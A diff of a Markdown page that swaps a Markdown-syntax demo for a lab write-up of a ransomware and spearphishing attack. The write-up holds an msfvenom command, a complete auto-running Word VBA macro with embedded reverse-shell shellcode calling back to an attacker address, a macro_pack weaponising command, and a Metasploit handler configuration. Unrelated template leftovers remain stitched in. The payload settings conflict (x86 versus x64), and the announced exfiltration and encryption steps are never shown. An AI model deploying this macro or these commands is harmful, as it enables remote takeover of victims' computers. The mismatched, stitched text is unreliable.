@@ -1,726 +1,139 @@
 # Ransomware Attack Demo: Basic Spearphishing and Exfiltration
 This document describes the setup and execution of a demo showing a simple example of a **Ransomware Attack**.
 
-## Attack Description and Threat Model
-In the scenario depicted below, the adversary will inject in a carefully constructed **Word document** a **VBA Script**. The adversary will then send this document to the victim through a tailored and customized mail message ([Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)).<br/>
+<br/>
+
+## Attack Description
+In the scenario depicted below, the adversary will inject in a carefully constructed **Word document** a **VBA Script** as an obfuscated payload. The adversary will then send this document to the victim through a tailored and customized mail message ([Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001/)).<br/>
 It is assumed that the victim will fall prey of the **Spearphishing Attack** and will download and open the document. Upon the opening, Microsoft Word will **execute** the VBA Script ([Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/005/)): this allows the adversary to have a **reverse shell** running on the victims platform and remotely controlled by the adversary itself.<br/>
-The attacker will then **exfiltrate** victim's files over the established channel ([Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)) and **encrypt** them in order to **compromise** their **integrity** and to demand a **ransom** ([Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)). 
+The attacker will then **exfiltrate** victim's files over the established channel ([Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)) and **encrypt** them in order to **compromise** their **integrity** and to demand a **ransom** ([Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486/)).
 
+<br/>
 
+## Threat Model
+The **Threat Model** necessary for this attack requires the adversary
+* knowing the e-mail address of the victim; 
+* being able to lure the victim to open the Spearphishing Attachment;
+* being able to establish a TCP connection with the victim's machine;
+* acquiring enough privileges on the victim's system in order to execute exfiltration and encryption commands.
 
+<br/>
 
+## Setup
+To perform the attack described above I used two Virtual Machines (referenced to as VMs in the following)
+1. The attacker is associated with a Kali Linux VM, with IPv4 Address `192.168.56.102`;
+2. The victim runs a Windows 10 VM, with IPv4 Address `192.168.56.101`.
 
+Both VMs have their network adapter configured as "Attached to NAT" in order to allow intra-communication withing the local network, but also inter-communication on the internet.
 
+<br/>
 
+## Preliminaries
+In order to create the Word document containing the malicious VBA Script, I have used `msfvenom` and a tool called [macro_pack](https://github.com/sevagas/macro_pack). Running the following command on Kali VM
+```
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --platform windows LHOST=192.168.56.102 LPORT=4444 -f vba > reverse_shell_exploit.vba
+```
+I am able to obtain a VBA Script that, when executed, will try to establish a TCP connection to the pair `<IPv4, Port> = <192.168.56.102, 4444>`. To make it more effective, I have edited it in order to launch a thread to do so:
+```vb
+#If VBA7 Then
+    Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Destination As LongPtr, ByRef Source As Any, ByVal Length As Long) As LongPtr
+#Else
+    Private Declare Function CreateThread Lib "kernel32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ThreadParameter As Long, ByVal CreateFlags As Long, ByRef ThreadId As Long) As Long
+    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Destination As Long, ByRef Source As Any, ByVal Length As Long) As Long
+#EndIf
 
+Private Sub Document_Open()
+    On Error Resume Next
+    Dim myBytes As Variant
+    Dim myThread As Long
+    
+    #If VBA7 Then
+        Dim myAlloc As LongPtr
+        Dim result As LongPtr
+    #Else
+        Dim myAlloc As Long
+        Dim result As Long
+    #EndIf
 
+    myBytes = Array(252,72,131,228,240,232,204,0,0,0,65,81,65,80,82,81,86,72,49,210,101,72,139,82,96,72,139, _
+                    82,24,72,139,82,32,72,15,183,74,74,77,49,201,72,139,114,80,72,49,192,172,60,97,124,2,44, _
+                    32,65,193,201,13,65,1,193,226,237,82,72,139,82,32,65,81,139,66,60,72,1,208,102,129,120, _
+                    24,11,2,15,133,114,0,0,0,139,128,136,0,0,0,72,133,192,116,103,72,1,208,139,72,24,80,68, _
+                    139,64,32,73,1,208,227,86,77,49,201,72,255,201,65,139,52,136,72,1,214,72,49,192,172,65, _
+                    193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1, _
+                    208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90, _
+                    65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,75,255,255,255, _
+                    93,73,190,119,115,50,95,51,50,0,0,65,86,73,137,230,72,129,236,160,1,0,0,73,137,229,73, _
+                    188,2,0,17,92,192,168,56,102,65,84,73,137,228,76,137,241,65,186,76,119,38,7,255,213,76, _
+                    137,234,104,1,1,0,0,89,65,186,41,128,107,0,255,213,106,10,65,94,80,80,77,49,201,77,49, _
+                    192,72,255,192,72,137,194,72,255,192,72,137,193,65,186,234,15,223,224,255,213,72,137, _
+                    199,106,16,65,88,76,137,226,72,137,249,65,186,153,165,116,97,255,213,133,192,116,10, _
+                    73,255,206,117,229,232,147,0,0,0,72,131,236,16,72,137,226,77,49,201,106,4,65,88,72, _
+                    137,249,65,186,2,217,200,95,255,213,131,248,0,126,85,72,131,196,32,94,137,246,106,64, _
+                    65,89,104,0,16,0,0,65,88,72,137,242,72,49,201,65,186,88,164,83,229,255,213,72,137,195, _
+                    73,137,199,77,49,201,73,137,240,72,137,218,72,137,249,65,186,2,217,200,95,255,213,131, _
+                    248,0,125,40,88,65,87,89,104,0,64,0,0,65,88,106,0,90,65,186,11,47,15,48,255,213,87,89, _
+                    65,186,117,110,77,97,255,213,73,255,206,233,60,255,255,255,72,1,195,72,41,198,72,133,246, _ 
+                    117,180,65,255,231,88,106,0,89,73,199,194,240,181,162,86,255,213)
 
+    myAlloc = VirtualAlloc(0, UBound(myBytes), &H1000, &H40)
+    
+    For i = LBound(myBytes) To UBound(myBytes)
+        result = RtlMoveMemory(myAlloc + i, myBytes(i), 1)
+    Next i
+    
+    result = CreateThread(0, 0, myAlloc, 0, 0, myThread)
+End Sub
 
+Private Sub AutoOpen()
+    Document_Open
+End Sub
 
-## Create, Share and Collaborate
+Private Sub Workbook_Open()
+    Document_Open
+End Sub
+```
+To then inject this payload inside a Word document I use `macro_pack`, by running the following command:
+```
+macro_pack.exe -f reverse_shell_exploit.vba -o -G malicious.docm
+```
+![Photo of Mountain](images/mountain.jpg)
+> **Note:** As stated by the author of this tool, a Windows platform with the right MS Office applications installed is required for Office documents automatic generation or trojan features, so I indeed needed to run the `macro_pack` command on an appropriate Windows VM (not previously mentioned for ease of global understanding).
 
+<br/>
+
+## Spearphishing
+Once the adversary was able to generate the payload `malicious.docm`, he needs to inject it into the victim's environment. I tried to perform a Spoofed Spearphishing Attack using [The Social-Engineer Toolkit (SET)](https://github.com/trustedsec/social-engineer-toolkit) and replicating the `units.it` domain using [hMailServer]( https://www.hmailserver.com), but there were compatibility issues as stated [here](https://github.com/trustedsec/social-engineer-toolkit/issues/810).<br/>
+Therefore I assumed that the adversary was able to obtain **Valid Credentials** for one **Domain Account** of the `units.it` domain, so it was indeed able to send the required Spearphishing Attachment to the victim.
 ![Photo of Mountain](images/mountain.jpg)
 
-[Docsify](https://docsify.js.org/#/) can generate article, portfolio and documentation websites on the fly. Unlike Docusaurus, Hugo and many other Static Site Generators (SSG), it does not generate static html files. Instead, it smartly loads and parses your Markdown content files and displays them as a website.
+<br/>
 
-## Introduction
-
-**Markdown** is a system-independent markup language that is easier to learn and use than **HTML**.
-
-![Figure 1: The Markdown Mark](images/markdown-red.png)
-
-Some of the key benefits are:
-
-1. Markdown is simple to learn, with minimal extra characters, so it's also quicker to write content.
-2. Less chance of errors when writing in markdown.
-3. Produces valid XHTML output.
-4. Keeps the content and the visual display separate, so you cannot mess up the look of your site.
-5. Write in any text editor or Markdown application you like.
-6. Markdown is a joy to use!
-
-John Gruber[^1], the author of Markdown, puts it like this:
-
-> The overriding design goal for Markdown’s formatting syntax is to make it as readable as possible. The idea is that a Markdown-formatted document should be publishable as-is, as plain text, without looking like it’s been marked up with tags or formatting instructions. While Markdown’s syntax has been influenced by several existing text-to-HTML filters, the single biggest source of inspiration for Markdown’s syntax is the format of plain text email.
-> -- <cite>John Gruber</cite>
-
-
-Without further delay, let us go over the main elements of Markdown and what the resulting HTML looks like:
-
-### Headings
-
-Headings from `h1` through `h6` are constructed with a `#` for each level:
-
-```markdown
-# h1 Heading
-## h2 Heading
-### h3 Heading
-#### h4 Heading
-##### h5 Heading
-###### h6 Heading
+## Exfiltration & Impact
+In order to be able to have a **reverse shell** at the victim's side connected to a remote shell client at the adversary's side, the attacker needs to launch a **listener** (prior to the opening of the `malicious.docm` payload).<br/>
+To do so, I have created a handler configuration file for `metasploit`, namely `handler.rc`, to instruct it to listen at port `4444` for TCP connections:
 ```
-
-Renders to:
-
-<h1> h1 Heading </h1>
-<h2>  h2 Heading </h2>
-<h3>  h3 Heading </h3>
-<h4>  h4 Heading </h4>
-<h5>  h5 Heading </h5>
-<h6>  h6 Heading </h6>
-
-HTML:
-
-```html
-<h1>h1 Heading</h1>
-<h2>h2 Heading</h2>
-<h3>h3 Heading</h3>
-<h4>h4 Heading</h4>
-<h5>h5 Heading</h5>
-<h6>h6 Heading</h6>
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.56.102
+set LPORT 4444
+set ExitOnSession false
+set EnableStageEncoding true
+set StageEncoder x64/xor_dynamic
+set AutoRunScript post/windows/manage/migrate NAME=explorer.exe KILL=false
+set SessionCommunicationTimeout 300
+set EnableUnicodeEncoding true
+set HandlerSSLCert /path/to/cert.pem
+set StageVerificationCode random
+exploit -j
 ```
-
-### Comments
-
-Comments should be HTML compatible
-
-```html
-<!--
-This is a comment
--->
+Then the listener is launched using the command
 ```
-Comment below should **NOT** be seen:
-
-<!--
-This is a comment
--->
-
-### Horizontal Rules
-
-The HTML `<hr>` element is for creating a "thematic break" between paragraph-level elements. In markdown, you can create a `<hr>` with any of the following:
-
-* `___`: three consecutive underscores
-* `---`: three consecutive dashes
-* `***`: three consecutive asterisks
-
-renders to:
-
-___
-
----
-
-***
-
-
-### Body Copy
-
-Body copy written as normal, plain text will be wrapped with `<p></p>` tags in the rendered HTML.
-
-So this body copy:
-
-```markdown
-Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.
+msfconsole -q -r handler.rc
 ```
-renders to this HTML:
-
-```html
-<p>Lorem ipsum dolor sit amet, graecis denique ei vel, at duo primis mandamus. Et legere ocurreret pri, animal tacimates complectitur ad cum. Cu eum inermis inimicus efficiendi. Labore officiis his ex, soluta officiis concludaturque ei qui, vide sensibus vim ad.</p>
-```
-
-### Emphasis
-
-#### Bold
-For emphasizing a snippet of text with a heavier font-weight.
-
-The following snippet of text is **rendered as bold text**.
-
-```markdown
-**rendered as bold text**
-```
-renders to:
-
-**rendered as bold text**
-
-and this HTML
-
-```html
-<strong>rendered as bold text</strong>
-```
-
-#### Italics
-For emphasizing a snippet of text with italics.
-
-The following snippet of text is _rendered as italicized text_.
-
-```markdown
-_rendered as italicized text_
-```
-
-renders to:
-
-_rendered as italicized text_
-
-and this HTML:
-
-```html
-<em>rendered as italicized text</em>
-```
-
-
-#### strikethrough
-In GFM (GitHub flavored Markdown) you can do strikethroughs.
-
-```markdown
-~~Strike through this text.~~
-```
-Which renders to:
-
-~~Strike through this text.~~
-
-HTML:
-
-```html
-<del>Strike through this text.</del>
-```
-
-### Blockquotes
-For quoting blocks of content from another source within your document.
-
-Add `>` before any text you want to quote.
-
-```markdown
-> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
-```
-
-Renders to:
-
-> **Fusion Drive** combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.
-
-and this HTML:
-
-```html
-<blockquote>
-  <p><strong>Fusion Drive</strong> combines a hard drive with a flash storage (solid-state drive) and presents it as a single logical volume with the space of both drives combined.</p>
-</blockquote>
-```
-
-Blockquotes can also be nested:
-
-```markdown
-> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
-Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
->> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
-odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
-```
-
-Renders to:
-
-> Donec massa lacus, ultricies a ullamcorper in, fermentum sed augue.
-Nunc augue augue, aliquam non hendrerit ac, commodo vel nisi.
->> Sed adipiscing elit vitae augue consectetur a gravida nunc vehicula. Donec auctor
-odio non est accumsan facilisis. Aliquam id turpis in dolor tincidunt mollis ac eu diam.
-
-### Lists
-
-#### Unordered
-A list of items in which the order of the items does not explicitly matter.
-
-You may use any of the following symbols to denote bullets for each list item:
-
-```markdown
-* valid bullet
-- valid bullet
-+ valid bullet
-```
-
-For example
-
-```markdown
-+ Lorem ipsum dolor sit amet
-+ Consectetur adipiscing elit
-+ Integer molestie lorem at massa
-+ Facilisis in pretium nisl aliquet
-+ Nulla volutpat aliquam velit
-  - Phasellus iaculis neque
-  - Purus sodales ultricies
-  - Vestibulum laoreet porttitor sem
-  - Ac tristique libero volutpat at
-+ Faucibus porta lacus fringilla vel
-+ Aenean sit amet erat nunc
-+ Eget porttitor lorem
-```
-Renders to:
-
-+ Lorem ipsum dolor sit amet
-+ Consectetur adipiscing elit
-+ Integer molestie lorem at massa
-+ Facilisis in pretium nisl aliquet
-+ Nulla volutpat aliquam velit
-  - Phasellus iaculis neque
-  - Purus sodales ultricies
-  - Vestibulum laoreet porttitor sem
-  - Ac tristique libero volutpat at
-+ Faucibus porta lacus fringilla vel
-+ Aenean sit amet erat nunc
-+ Eget porttitor lorem
-
-And this HTML
-
-```html
-<ul>
-  <li>Lorem ipsum dolor sit amet</li>
-  <li>Consectetur adipiscing elit</li>
-  <li>Integer molestie lorem at massa</li>
-  <li>Facilisis in pretium nisl aliquet</li>
-  <li>Nulla volutpat aliquam velit
-    <ul>
-      <li>Phasellus iaculis neque</li>
-      <li>Purus sodales ultricies</li>
-      <li>Vestibulum laoreet porttitor sem</li>
-      <li>Ac tristique libero volutpat at</li>
-    </ul>
-  </li>
-  <li>Faucibus porta lacus fringilla vel</li>
-  <li>Aenean sit amet erat nunc</li>
-  <li>Eget porttitor lorem</li>
-</ul>
-```
-
-#### Ordered
-
-A list of items in which the order of items does explicitly matter.
-
-```markdown
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-```
-Renders to:
-
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-
-And this HTML:
-
-```html
-<ol>
-  <li>Lorem ipsum dolor sit amet</li>
-  <li>Consectetur adipiscing elit</li>
-  <li>Integer molestie lorem at massa</li>
-  <li>Facilisis in pretium nisl aliquet</li>
-  <li>Nulla volutpat aliquam velit</li>
-  <li>Faucibus porta lacus fringilla vel</li>
-  <li>Aenean sit amet erat nunc</li>
-  <li>Eget porttitor lorem</li>
-</ol>
-```
-
-**TIP**: If you just use `1.` for each number, Markdown will automatically number each item. For example:
-
-```markdown
-1. Lorem ipsum dolor sit amet
-1. Consectetur adipiscing elit
-1. Integer molestie lorem at massa
-1. Facilisis in pretium nisl aliquet
-1. Nulla volutpat aliquam velit
-1. Faucibus porta lacus fringilla vel
-1. Aenean sit amet erat nunc
-1. Eget porttitor lorem
-```
-
-Renders to:
-
-1. Lorem ipsum dolor sit amet
-2. Consectetur adipiscing elit
-3. Integer molestie lorem at massa
-4. Facilisis in pretium nisl aliquet
-5. Nulla volutpat aliquam velit
-6. Faucibus porta lacus fringilla vel
-7. Aenean sit amet erat nunc
-8. Eget porttitor lorem
-
-### Code
-
-#### Inline code
-Wrap inline snippets of code with `` ` ``.
-
-```markdown
-In this example, `<section></section>` should be wrapped as **code**.
-```
-
-Renders to:
-
-In this example, `<section></section>` should be wrapped with **code**.
-
-HTML:
-
-```html
-<p>In this example, <code>&lt;section&gt;&lt;/section&gt;</code> should be wrapped with <strong>code</strong>.</p>
-```
-
-#### Indented code
-
-Or indent several lines of code by at least four spaces, as in:
-
-<pre>
-  // Some comments
-  line 1 of code
-  line 2 of code
-  line 3 of code
-</pre>
-
-Renders to:
-
-    // Some comments
-    line 1 of code
-    line 2 of code
-    line 3 of code
-
-HTML:
-
-```html
-<pre>
-  <code>
-    // Some comments
-    line 1 of code
-    line 2 of code
-    line 3 of code
-  </code>
-</pre>
-```
-
-
-#### Block code "fences"
-
-Use "fences"  ```` ``` ```` to block in multiple lines of code.
-
-<pre>
-``` markup
-Sample text here...
-```
-</pre>
-
-
-```
-Sample text here...
-```
-
-HTML:
-
-```html
-<pre>
-  <code>Sample text here...</code>
-</pre>
-```
-
-#### Syntax highlighting
-
-GFM, or "GitHub Flavored Markdown" also supports syntax highlighting. To activate it, simply add the file extension of the language you want to use directly after the first code "fence", ` ```js `, and syntax highlighting will automatically be applied in the rendered HTML. For example, to apply syntax highlighting to JavaScript code:
-
-<pre>
-```js
-grunt.initConfig({
-  assemble: {
-    options: {
-      assets: 'docs/assets',
-      data: 'src/data/*.{json,yml}',
-      helpers: 'src/custom-helpers.js',
-      partials: ['src/partials/**/*.{hbs,md}']
-    },
-    pages: {
-      options: {
-        layout: 'default.hbs'
-      },
-      files: {
-        './': ['src/templates/pages/index.hbs']
-      }
-    }
-  }
-};
-```
-</pre>
-
-Renders to:
-
-```js
-grunt.initConfig({
-  assemble: {
-    options: {
-      assets: 'docs/assets',
-      data: 'src/data/*.{json,yml}',
-      helpers: 'src/custom-helpers.js',
-      partials: ['src/partials/**/*.{hbs,md}']
-    },
-    pages: {
-      options: {
-        layout: 'default.hbs'
-      },
-      files: {
-        './': ['src/templates/pages/index.hbs']
-      }
-    }
-  }
-};
-```
-
-### Tables
-Tables are created by adding pipes as dividers between each cell, and by adding a line of dashes (also separated by bars) beneath the header. Note that the pipes do not need to be vertically aligned.
-
-
-```markdown
-| Option | Description |
-| ------ | ----------- |
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-```
-
-Renders to:
-
-| Option | Description |
-| ------ | ----------- |
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-
-And this HTML:
-
-```html
-<table>
-  <tr>
-    <th>Option</th>
-    <th>Description</th>
-  </tr>
-  <tr>
-    <td>data</td>
-    <td>path to data files to supply the data that will be passed into templates.</td>
-  </tr>
-  <tr>
-    <td>engine</td>
-    <td>engine to be used for processing templates. Handlebars is the default.</td>
-  </tr>
-  <tr>
-    <td>ext</td>
-    <td>extension to be used for dest files.</td>
-  </tr>
-</table>
-```
-
-### Right aligned text
-
-Adding a colon on the right side of the dashes below any heading will right align text for that column.
-
-```markdown
-| Option | Description |
-| ------:| -----------:|
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-```
-
-| Option | Description |
-| ------:| -----------:|
-| data   | path to data files to supply the data that will be passed into templates. |
-| engine | engine to be used for processing templates. Handlebars is the default. |
-| ext    | extension to be used for dest files. |
-
-### Links
-
-#### Basic link
-
-```markdown
-[Assemble](http://assemble.io)
-```
-
-Renders to (hover over the link, there is no tooltip):
-
-[Assemble](http://assemble.io)
-
-HTML:
-
-```html
-<a href="http://assemble.io">Assemble</a>
-```
-
-
-#### Add a title
-
-```markdown
-[Upstage](https://github.com/upstage/ "Visit Upstage!")
-```
-
-Renders to (hover over the link, there should be a tooltip):
-
-[Upstage](https://github.com/upstage/ "Visit Upstage!")
-
-HTML:
-
-```html
-<a href="https://github.com/upstage/" title="Visit Upstage!">Upstage</a>
-```
-
-#### Named Anchors
-
-Named anchors enable you to jump to the specified anchor point on the same page. For example, each of these chapters:
-
-```markdown
-# Table of Contents
-  * [Chapter 1](#chapter-1)
-  * [Chapter 2](#chapter-2)
-  * [Chapter 3](#chapter-3)
-```
-will jump to these sections:
-
-```markdown
-### Chapter 1 <a id="chapter-1"></a>
-Content for chapter one.
-
-### Chapter 2 <a id="chapter-2"></a>
-Content for chapter one.
-
-### Chapter 3 <a id="chapter-3"></a>
-Content for chapter one.
-```
-**NOTE** that specific placement of the anchor tag seems to be arbitrary. They are placed inline here since it seems to be unobtrusive, and it works.
-
-### Images
-Images have a similar syntax to links but include a preceding exclamation point.
-
-```markdown
-![Image of Minion](https://octodex.github.com/images/minion.png)
-```
-![Image of Minion](https://octodex.github.com/images/minion.png)
-
-and using a local image (which also displays in GitHub):
-
-```markdown
-![Image of Octocat](images/octocat.jpg)
-```
-![Image of Octocat](images/octocat.jpg)
-
-## Topic One  
-
-Lorem markdownum in maior in corpore ingeniis: causa clivo est. Rogata Veneri terrebant habentem et oculos fornace primusque et pomaria et videri putri, levibus. Sati est novi tenens aut nitidum pars, spectabere favistis prima et capillis in candida spicis; sub tempora, aliquo.
-
-## Topic Two
-
-Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
-Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
-tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
-qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
-telum spectatorem at aequor.
-
-## Topic Three
-
-### Overview
-
-Lorem markdownum vides aram est sui istis excipis Danai elusaque manu fores.
-Illa hunc primo pinum pertulit conplevit portusque pace *tacuit* sincera. Iam
-tamen licentia exsulta patruelibus quam, deorum capit; vultu. Est *Philomela
-qua* sanguine fremit rigidos teneri cacumina anguis hospitio incidere sceptroque
-telum spectatorem at aequor.
-
-### Subtopic One
-
-Lorem markdownum murmure fidissime suumque. Nivea agris, duarum longaeque Ide
-rugis Bacchum patria tuus dea, sum Thyneius liquor, undique. **Nimium** nostri
-vidisset fluctibus **mansit** limite rigebant; enim satis exaudi attulit tot
-lanificae [indice](http://www.mozilla.org/) Tridentifer laesum. Movebo et fugit,
-limenque per ferre graves causa neque credi epulasque isque celebravit pisces.
-
-- Iasone filum nam rogat
-- Effugere modo esse
-- Comminus ecce nec manibus verba Persephonen taxo
-- Viribus Mater
-- Bello coeperunt viribus ultima fodiebant volentem spectat
-- Pallae tempora
-
-#### Fuit tela Caesareos tamen per balatum
-
-De obstruat, cautes captare Iovem dixit gloria barba statque. Purpureum quid
-puerum dolosae excute, debere prodest **ignes**, per Zanclen pedes! *Ipsa ea
-tepebat*, fiunt, Actoridaeque super perterrita pulverulenta. Quem ira gemit
-hastarum sucoque, idem invidet qui possim mactatur insidiosa recentis, **res
-te** totumque [Capysque](http://tumblr.com/)! Modo suos, cum parvo coniuge, iam
-sceleris inquit operatus, abundet **excipit has**.
-
-In locumque *perque* infelix hospite parente adducto aequora Ismarios,
-feritatis. Nomine amantem nexibus te *secum*, genitor est nervo! Putes
-similisque festumque. Dira custodia nec antro inornatos nota aris, ducere nam
-genero, virtus rite.
-
-- Citius chlamydis saepe colorem paludosa territaque amoris
-- Hippolytus interdum
-- Ego uterque tibi canis
-- Tamen arbore trepidosque
-
-#### Colit potiora ungues plumeus de glomerari num
-
-Conlapsa tamen innectens spes, in Tydides studio in puerili quod. Ab natis non
-**est aevi** esse riget agmenque nutrit fugacis.
-
-- Coortis vox Pylius namque herbosas tuae excedere
-- Tellus terribilem saetae Echinadas arbore digna
-- Erraverit lectusque teste fecerat
-
-Suoque descenderat illi; quaeritur ingens cum periclo quondam flaventibus onus
-caelum fecit bello naides ceciderunt cladis, enim. Sunt aliquis.
-
-### Subtopic Two
-
-Lorem *markdownum saxum et* telum revellere in victus vultus cogamque ut quoque
-spectat pestiferaque siquid me molibus, mihi. Terret hinc quem Phoebus? Modo se
-cunctatus sidera. Erat avidas tamen antiquam; ignes igne Pelates
-[morte](http://www.youtube.com/watch?v=MghiBW3r65M) non caecaque canam Ancaeo
-contingat militis concitus, ad!
-
-#### Et omnis blanda fetum ortum levatus altoque
-
-Totos utinamque nutricis. Lycaona cum non sine vocatur tellus campus insignia et
-absumere pennas Cythereiadasque pericula meritumque Martem longius ait moras
-aspiciunt fatorum. Famulumque volvitur vultu terrae ut querellas hosti deponere
-et dixit est; in pondus fonte desertum. Condidit moras, Carpathius viros, tuta
-metum aethera occuluit merito mente tenebrosa et videtur ut Amor et una
-sonantia. Fuit quoque victa et, dum ora rapinae nec ipsa avertere lata, profugum
-*hectora candidus*!
-
-#### Et hanc
-
-Quo sic duae oculorum indignos pater, vis non veni arma pericli! Ita illos
-nitidique! Ignavo tibi in perdam, est tu precantia fuerat
-[revelli](http://jaspervdj.be/).
-
-Non Tmolus concussit propter, et setae tum, quod arida, spectata agitur, ferax,
-super. Lucemque adempto, et At tulit navem blandas, et quid rex, inducere? Plebe
-plus *cum ignes nondum*, fata sum arcus lustraverat tantis!
-
-#### Adulterium tamen instantiaque puniceum et formae patitur
-
-Sit paene [iactantem suos](http://www.metafilter.com/) turbineo Dorylas heros,
-triumphos aquis pavit. Formatae res Aeolidae nomen. Nolet avum quique summa
-cacumine dei malum solus.
-
-1. Mansit post ambrosiae terras
-2. Est habet formidatis grandior promissa femur nympharum
-3. Maestae flumina
-4. Sit more Trinacris vitasset tergo domoque
-5. Anxia tota tria
-6. Est quo faece nostri in fretum gurgite
-
-Themis susurro tura collo: cunas setius *norat*, Calydon. Hyaenam terret credens
-habenas communia causas vocat fugamque roganti Eleis illa ipsa id est madentis
-loca: Ampyx si quis. Videri grates trifida letum talia pectus sequeretur erat
-ignescere eburno e decolor terga.
 
 > Note: Example page content from [GetGrav.org](https://learn.getgrav.org/17/content/markdown), included to demonstrate the portability of Markdown-based content
 
